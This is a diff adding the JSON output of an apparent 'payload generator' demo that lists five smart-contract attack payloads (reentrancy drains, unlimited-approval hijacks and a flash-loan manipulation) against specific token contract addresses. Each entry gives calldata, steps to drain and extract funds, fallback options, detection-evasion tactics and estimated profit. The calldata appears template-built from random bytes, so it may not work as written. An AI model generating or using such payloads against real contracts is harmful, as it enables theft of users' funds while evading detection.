@@ -1,0 +1,269 @@
+{
+  "generation_info": {
+    "start_time": "2025-09-17T18:24:34.942594",
+    "framework": "Shadowscan Advanced Payload Generator",
+    "version": "15.0.0",
+    "mode": "Payload Generation Demo",
+    "execution_time": 0.0053098201751708984,
+    "end_time": "2025-09-17T18:24:34.947921"
+  },
+  "payloads": [
+    {
+      "payload_id": "payload_1758104674_3a3e06e164730421",
+      "vulnerability_type": "reentrancy",
+      "target_address": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+      "payload_data": "0x2e1a7d4dd9aac443df112b0a7f5236ae41f0d19b8de391a5304a5334cb6d3dca78f76c328d8c9bbe7970b71c7853cf939ed663d1",
+      "payload_type": "recursive_call",
+      "gas_limit": 450000,
+      "gas_price": 0,
+      "value": 0,
+      "success_probability": 0.624,
+      "estimated_profit": 5.155917570791637,
+      "risk_level": "high",
+      "complexity": "medium",
+      "execution_steps": [
+        "1. Call vulnerable function",
+        "2. Trigger recursive call before state update",
+        "3. Drain funds in recursive calls",
+        "4. Exit with extracted funds"
+      ],
+      "required_approvals": [
+        "token_approval",
+        "contract_interaction"
+      ],
+      "fallback_mechanisms": [
+        "Fallback to simple drain",
+        "Use alternative entry point",
+        "Reduce gas limit if needed"
+      ],
+      "detection_evasion": [
+        "Random timing between calls",
+        "Varying gas prices",
+        "Multiple transaction paths"
+      ],
+      "optimization_techniques": [
+        "gas_optimization",
+        "timing_optimization",
+        "evasion_optimization"
+      ],
+      "metadata": {
+        "template_used": "reentrancy",
+        "parameters": {
+          "amount": "d9aac443df112b0a7f5236ae41f0d19b8de391a5304a5334cb6d3dca78f76c32",
+          "padding": "8d8c9bbe7970b71c7853cf939ed663d1"
+        },
+        "generation_method": "template_based"
+      },
+      "created_at": "2025-09-17T18:24:34.943046",
+      "expires_at": "2025-09-18T18:24:34.943057"
+    },
+    {
+      "payload_id": "payload_1758104674_11e9a0da9f56ca78",
+      "vulnerability_type": "approval_hijack",
+      "target_address": "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
+      "payload_data": "0x095ea7b34eb2b11f93d40de86997e54a5973ad86ae57eff41189029ef88732c8ece3a53affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+      "payload_type": "unlimited_approval",
+      "gas_limit": 120000,
+      "gas_price": 0,
+      "value": 0,
+      "success_probability": 0.8999999999999999,
+      "estimated_profit": 2.3007697045982876,
+      "risk_level": "medium",
+      "complexity": "low",
+      "execution_steps": [
+        "1. Get unlimited approval",
+        "2. Transfer approved tokens",
+        "3. Repeat for maximum profit",
+        "4. Exit with extracted funds"
+      ],
+      "required_approvals": [
+        "user_approval",
+        "token_approval"
+      ],
+      "fallback_mechanisms": [
+        "Use partial approvals",
+        "Multiple small transfers",
+        "Alternative token contracts"
+      ],
+      "detection_evasion": [
+        "Small approval amounts first",
+        "Delay between transfers",
+        "Use multiple addresses"
+      ],
+      "optimization_techniques": [
+        "gas_optimization",
+        "concurrent_optimization",
+        "evasion_optimization"
+      ],
+      "metadata": {
+        "template_used": "approval_hijack",
+        "parameters": {
+          "spender": "4eb2b11f93d40de86997e54a5973ad86ae57eff41189029ef88732c8ece3a53a",
+          "amount": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        },
+        "generation_method": "template_based"
+      },
+      "created_at": "2025-09-17T18:24:34.943500",
+      "expires_at": "2025-09-19T18:24:34.943508"
+    },
+    {
+      "payload_id": "payload_1758104674_fb6d843d59f28b48",
+      "vulnerability_type": "approval_hijack",
+      "target_address": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+      "payload_data": "0x095ea7b3ff9f8381bf068c49c743acccbf6bfc556248d7494ebed4f713268ad2d00ae281ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+      "payload_type": "unlimited_approval",
+      "gas_limit": 120000,
+      "gas_price": 0,
+      "value": 0,
+      "success_probability": 0.7200000000000001,
+      "estimated_profit": 1.4864887198755468,
+      "risk_level": "medium",
+      "complexity": "medium",
+      "execution_steps": [
+        "1. Get unlimited approval",
+        "2. Transfer approved tokens",
+        "3. Repeat for maximum profit",
+        "4. Exit with extracted funds"
+      ],
+      "required_approvals": [
+        "user_approval",
+        "token_approval"
+      ],
+      "fallback_mechanisms": [
+        "Use partial approvals",
+        "Multiple small transfers",
+        "Alternative token contracts"
+      ],
+      "detection_evasion": [
+        "Small approval amounts first",
+        "Delay between transfers",
+        "Use multiple addresses"
+      ],
+      "optimization_techniques": [
+        "gas_optimization",
+        "concurrent_optimization",
+        "evasion_optimization"
+      ],
+      "metadata": {
+        "template_used": "approval_hijack",
+        "parameters": {
+          "spender": "ff9f8381bf068c49c743acccbf6bfc556248d7494ebed4f713268ad2d00ae281",
+          "amount": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        },
+        "generation_method": "template_based"
+      },
+      "created_at": "2025-09-17T18:24:34.944565",
+      "expires_at": "2025-09-19T18:24:34.944577"
+    },
+    {
+      "payload_id": "payload_1758104674_b290066839173a29",
+      "vulnerability_type": "reentrancy",
+      "target_address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      "payload_data": "0x2e1a7d4d3635c4b14ea69b418710d60c6cfea8da7d2e2c219262edbb65d8d4f56ff30b4dd041a0a2f03dfbeccd9ee34d18ff7f1c",
+      "payload_type": "recursive_call",
+      "gas_limit": 450000,
+      "gas_price": 0,
+      "value": 0,
+      "success_probability": 0.46799999999999997,
+      "estimated_profit": 3.8279737997198113,
+      "risk_level": "high",
+      "complexity": "high",
+      "execution_steps": [
+        "1. Call vulnerable function",
+        "2. Trigger recursive call before state update",
+        "3. Drain funds in recursive calls",
+        "4. Exit with extracted funds"
+      ],
+      "required_approvals": [
+        "token_approval",
+        "contract_interaction"
+      ],
+      "fallback_mechanisms": [
+        "Fallback to simple drain",
+        "Use alternative entry point",
+        "Reduce gas limit if needed"
+      ],
+      "detection_evasion": [
+        "Random timing between calls",
+        "Varying gas prices",
+        "Multiple transaction paths"
+      ],
+      "optimization_techniques": [
+        "gas_optimization",
+        "timing_optimization",
+        "evasion_optimization"
+      ],
+      "metadata": {
+        "template_used": "reentrancy",
+        "parameters": {
+          "amount": "3635c4b14ea69b418710d60c6cfea8da7d2e2c219262edbb65d8d4f56ff30b4d",
+          "padding": "d041a0a2f03dfbeccd9ee34d18ff7f1c"
+        },
+        "generation_method": "template_based"
+      },
+      "created_at": "2025-09-17T18:24:34.944975",
+      "expires_at": "2025-09-18T18:24:34.944985"
+    },
+    {
+      "payload_id": "payload_1758104674_3cde4935c34e040e",
+      "vulnerability_type": "flash_loan",
+      "target_address": "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+      "payload_data": "0x2f2ff15d97733c9b13bff556303d6c697c9df214bfdac530e2bd6260833e6881f0b7eb8293c841e78f1c6aa9575542dc1490f2807ed53e452da06c9b71205329dac5b3158c92b7713c6415610561fca3fdd0859bb917532e672b6d88e42c78eef2b6b635",
+      "payload_type": "borrow_execute_repay",
+      "gas_limit": 1000000,
+      "gas_price": 0,
+      "value": 0,
+      "success_probability": 0.33,
+      "estimated_profit": 5.708556454233914,
+      "risk_level": "critical",
+      "complexity": "high",
+      "execution_steps": [
+        "1. Borrow flash loan",
+        "2. Execute arbitrage/manipulation",
+        "3. Repay loan with profit",
+        "4. Extract remaining profit"
+      ],
+      "required_approvals": [
+        "flash_loan_approval",
+        "trading_approval"
+      ],
+      "fallback_mechanisms": [
+        "Use smaller loan amount",
+        "Alternative arbitrage path",
+        "Direct manipulation if loan fails"
+      ],
+      "detection_evasion": [
+        "Split into multiple transactions",
+        "Use intermediate contracts",
+        "Randomize execution timing"
+      ],
+      "optimization_techniques": [
+        "gas_optimization",
+        "timing_optimization",
+        "network_optimization"
+      ],
+      "metadata": {
+        "template_used": "flash_loan",
+        "parameters": {
+          "asset": "97733c9b13bff556303d6c697c9df214bfdac530e2bd6260833e6881f0b7eb82",
+          "amount": "93c841e78f1c6aa9575542dc1490f2807ed53e452da06c9b71205329dac5b315",
+          "params": "8c92b7713c6415610561fca3fdd0859bb917532e672b6d88e42c78eef2b6b635"
+        },
+        "generation_method": "template_based"
+      },
+      "created_at": "2025-09-17T18:24:34.945336",
+      "expires_at": "2025-09-18T00:24:34.945344"
+    }
+  ],
+  "summary": {
+    "total_payloads_generated": 5,
+    "successful_generations": 5,
+    "failed_generations": 0,
+    "average_generation_time": 0.0001499176025390625,
+    "average_optimization_score": 0.5142382374953152,
+    "total_estimated_profit": 18.4797062492192,
+    "highest_profit_payload": "payload_1758104674_3cde4935c34e040e",
+    "best_optimization_score": 0.6690230911379486,
+    "vulnerability_types_covered": 3
+  }
+}
